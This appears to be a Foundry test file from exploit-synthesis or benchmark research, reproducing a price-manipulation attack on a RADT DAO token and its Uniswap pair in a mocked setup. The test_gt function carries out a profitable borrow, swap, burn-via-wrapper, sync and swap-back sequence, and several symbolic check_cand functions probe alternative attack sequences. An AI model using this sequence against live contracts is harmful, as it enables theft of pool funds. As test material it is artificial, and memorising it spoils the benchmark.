// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./RADTDAO.sol";
import "./Wrapper.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract RADTDAOTest is Test, BlockLoader {
    RADTDAO radt;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    Wrapper wrapper;
    AttackContract attackContract;
    address owner;
    address attacker;
    address radtAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address wrapperAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1663905800;
    uint112 reserve0pair = 94453473060895791601540;
    uint112 reserve1pair = 8163658010724952139310;
    uint32 blockTimestampLastpair = 1663905794;
    uint256 kLastpair = 771084437533614376388993871504910532570047377;
    uint256 price0CumulativeLastpair = 1221402894907148026766298229634119016688;
    uint256 price1CumulativeLastpair =
        171626870517834744593910101969779780246953;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 94453473060895791601540;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtwrapper = 0;
    uint256 totalSupplyradt = 999999000000000000000000;
    uint256 balanceOfradtpair = 8163658010724952139310;
    uint256 balanceOfradtattacker = 0;
    uint256 balanceOfradtwrapper = 0;

    function setUp() public {
        owner = address(this);
        radt = new RADTDAO();
        radtAddr = address(radt);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(radt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        wrapper = new Wrapper(address(radt));
        wrapperAddr = address(wrapper);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        radt.transfer(address(pair), balanceOfradtpair);
        radt.afterDeploy(address(pair), address(wrapper));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Radt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(radt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(radt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(usdt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(pair),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(attackContract),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_radt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_radt(uint256 amount) internal {
        radt.transfer(owner, amount);
    }

    function borrow_pair_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdt(uint256 amount) internal {
        usdt.transfer(address(pair), amount);
    }

    function borrow_pair_radt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_radt(uint256 amount) internal {
        radt.transfer(address(pair), amount);
    }

    function swap_pair_usdt_radt(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(radt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_radt_usdt(uint256 amount) internal {
        radt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(radt);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_radt(uint256 amount) internal {
        wrapper.withdraw(address(owner), address(pair), amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_usdt(1000e18);
        printBalance("After step0 ");
        swap_pair_usdt_radt(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_radt((radt.balanceOf(address(pair)) * 100) / 9);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_radt_usdt(radt.balanceOf(attacker));
        printBalance("After step4 ");
        payback_owner_usdt((1000e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_radt(amt1);
        burn_pair_radt(amt2);
        sync_pair();
        swap_pair_radt_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_radt(amt0);
        burn_pair_radt(amt1);
        payback_owner_radt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_radt(amt0);
        burn_pair_radt(amt1);
        payback_pair_radt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_radt(amt0);
        burn_pair_radt(amt1);
        swap_pair_radt_usdt(amt2);
        payback_owner_radt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_radt(amt0);
        burn_pair_radt(amt1);
        sync_pair();
        payback_owner_radt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_radt(amt0);
        burn_pair_radt(amt1);
        swap_pair_radt_usdt(amt2);
        payback_pair_radt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_radt(amt0);
        burn_pair_radt(amt1);
        sync_pair();
        payback_pair_radt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_radt(amt1);
        burn_pair_radt(amt2);
        swap_pair_radt_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_radt(amt0);
        burn_pair_radt(amt1);
        swap_pair_radt_usdt(amt2);
        swap_pair_radt_usdt(amt3);
        payback_owner_radt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_radt(amt0);
        burn_pair_radt(amt1);
        sync_pair();
        swap_pair_radt_usdt(amt2);
        payback_owner_radt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_radt(amt1);
        burn_pair_radt(amt2);
        swap_pair_radt_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_radt(amt0);
        burn_pair_radt(amt1);
        swap_pair_radt_usdt(amt2);
        swap_pair_radt_usdt(amt3);
        payback_pair_radt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_radt(amt0);
        burn_pair_radt(amt1);
        sync_pair();
        swap_pair_radt_usdt(amt2);
        payback_pair_radt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_radt(amt1);
        burn_pair_radt(amt2);
        swap_pair_radt_usdt(amt3);
        swap_pair_radt_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_radt(amt1);
        burn_pair_radt(amt2);
        sync_pair();
        swap_pair_radt_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
